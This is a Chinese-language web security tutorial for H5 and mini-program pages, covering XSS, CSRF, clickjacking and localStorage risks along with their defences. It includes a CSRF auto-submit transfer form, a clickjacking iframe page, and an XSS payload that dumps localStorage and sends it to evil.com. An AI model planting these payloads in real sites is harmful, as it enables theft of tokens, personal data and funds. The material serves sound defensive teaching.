# H5 安全基础

### 6.1 XSS（跨站脚本攻击）

H5 应用中的 XSS 是最常见的漏洞类型，在小程序内嵌 H5 页面中尤为危险。

**XSS 类型与 H5 场景**：

```
┌──────────────────────────────────────────────────────────┐
│                    XSS 攻击类型                            │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  反射型 XSS     →  URL 参数直接输出到页面                    │
│  存储型 XSS     →  恶意脚本存入数据库，他人访问时触发          │
│  DOM 型 XSS    →  前端 JS 处理用户输入不当写入 DOM           │
│  突变型 XSS     →  浏览器解析差异导致非预期的 XSS              │
│                                                          │
└──────────────────────────────────────────────────────────┘
```

**H5 页面中常见 XSS 点**：

```javascript
// 1. innerHTML 注入
document.getElementById('content').innerHTML = userInput; // 危险！

// 2. document.write
document.write('<div>' + getQueryParam('name') + '</div>'); // 危险！

// 3. jQuery html()
$('#content').html(userInput); // 危险！

// 4. 模板注入
var template = `<div>${userInput}</div>`; // 危险！

// 5. eval / Function
eval(userInput); // 极其危险！

// 6. href 注入
location.href = userInput; // 可导致 javascript: 伪协议执行

// 7. 小程序 WebView URL 参数注入
<web-view src="https://h5.target.com/page?data={{userInput}}"></web-view>
// 如果 userInput 可控且页面未过滤，可能触发 XSS
```

**XSS 防御**：

```javascript
// 1. 输出编码
function encodeHTML(str) {
    return str.replace(/&/g, '&amp;')
              .replace(/</g, '&lt;')
              .replace(/>/g, '&gt;')
              .replace(/"/g, '&quot;')
              .replace(/'/g, '&#x27;');
}

// 2. 使用 textContent 代替 innerHTML
element.textContent = userInput; // 自动编码

// 3. CSP 头部
// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

// 4. 使用安全模板引擎（自动转义）
// Vue: {{ }} 默认转义，v-html 需谨慎使用
// React: JSX 默认转义，dangerouslySetInnerHTML 需谨慎使用
```

### 6.2 CSRF（跨站请求伪造）

```html
<!-- CSRF 攻击示例 -->
<!-- 攻击者构造的恶意页面 -->
<html>
<body>
    <!-- 自动提交表单 -->
    <form id="f" action="https://api.target.com/v1/transfer" method="POST">
        <input type="hidden" name="toAccount" value="attacker_account" />
        <input type="hidden" name="amount" value="10000" />
    </form>
    <script>document.getElementById('f').submit();</script>
</body>
</html>

<!-- 如果用户已登录目标站点，Cookie 会自动携带 -->
```

**CSRF 防御**：

```
1. CSRF Token 验证
   - 服务端生成随机 Token，嵌入页面
   - 每次请求需携带 Token，服务端校验

2. SameSite Cookie
   - Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
   - 限制跨站请求携带 Cookie

3. 自定义请求头验证
   - 要求请求携带 X-Requested-With 等自定义头
   - 跨域请求需预检（CORS preflight）

4. 二次验证
   - 敏感操作要求输入验证码或密码
```

### 6.3 点击劫持（Clickjacking）

```html
<!-- 点击劫持攻击示例 -->
<html>
<head><style>iframe { opacity: 0; position: absolute; top: 0; left: 0; }</style></head>
<body>
    <!-- 用户看到的诱饵按钮 -->
    <button style="position: absolute; top: 100px; left: 100px;">点击领取红包</button>

    <!-- 透明的目标页面 iframe -->
    <iframe src="https://target.com/delete-account" width="500" height="500"></iframe>
</body>
</html>
```

**防御**：

```bash
# 1. X-Frame-Options 响应头
X-Frame-Options: DENY              # 禁止嵌入
X-Frame-Options: SAMEORIGIN         # 仅同源可嵌入

# 2. CSP frame-ancestors 指令
Content-Security-Policy: frame-ancestors 'self'

# 3. JavaScript 帧破坏
if (window.top !== window.self) {
    window.top.location = window.self.location;
}
```

### 6.4 本地存储安全

```javascript
// localStorage / sessionStorage 安全风险

// 危险示例1：存储敏感数据
localStorage.setItem('token', 'eyJhbGciOiJIUzI1NiIs...');
localStorage.setItem('userPassword', 'admin123');

// 危险示例2：存储用户隐私数据
localStorage.setItem('userInfo', JSON.stringify({
    phone: '13800138000',
    idCard: '110101199001011234',
    bankCard: '6225881234567890'
}));

// 攻击者利用 XSS 可直接读取 localStorage
// 恶意 XSS Payload:
var data = '';
for (var i = 0; i < localStorage.length; i++) {
    var key = localStorage.key(i);
    data += key + '=' + localStorage.getItem(key) + '\n';
}
// 发送到攻击者服务器
new Image().src = 'https://evil.com/steal?data=' + encodeURIComponent(data);

// 安全建议：
// 1. 敏感数据不要存储在 localStorage
// 2. 使用 HttpOnly Cookie 存储 Token
// 3. 如必须前端存储，应加密后存储
// 4. 设置合理的数据过期时间
```
